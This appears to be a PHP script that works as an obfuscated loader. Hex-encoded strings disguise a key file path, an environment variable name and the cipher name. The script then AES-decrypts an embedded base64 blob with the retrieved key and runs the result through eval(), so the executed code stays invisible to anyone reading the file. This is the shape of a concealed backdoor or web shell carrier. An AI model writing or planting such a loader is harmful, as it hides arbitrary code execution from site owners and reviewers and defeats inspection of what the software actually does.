<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('MZtqOKnzsX7kSnSkJ98ohg==');

$c=base64_decode(

'ms+GzskYtFBNxHRvpRdDdu2NheSZwd5IawLHEF+J04iTclBflAP9Sp0XjN2tn8KizC9dr17nH9NF' .
'z1Luep3x5GlRTQOR2IvNdBm/mWh/VlpkWCQtqQ9SuX/nzOHv1DBxz8OCb9XEM7Jje3hClVmCxa5v' .
'WAPjZzPTPaOWtSBpHW2ipepBlq5oaOUucyUCOG0uVFuRcJdQkAMe7n4HOIa4Ehivmf3NtX8Ck/Ud' .
'Ep4ha+Jxdnz1Ur8/dkgAyd+TweSjUGXldvK7BRZf2koAuUfzdIb7d7F1vJpAQ9WHlTp6vk5udvKm' .
'8XGNB3e8+nJkT4zmWHieSt07CaSZOfyX+uYT7Ab9O8HzJ8g7Amjc6kllr8+TC0ffRWudnRx7185F' .
'hVyh37m6b5A3eGp3HsHi+K3bZb98KLjd3ih+886X0TG2Pnqk6TBCuNyZAmwYU7JmgNBsSfkD2Hy5' .
'NgOHK2T4DIDByIHrpqh3v0AWN2GNrOLiu+T/D2x3IjLoNQy2PJziRJsozweQjmL+DjOQbzQtJHC3' .
'Lv3l7ThnFkL3eSDsIVUKq/I='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

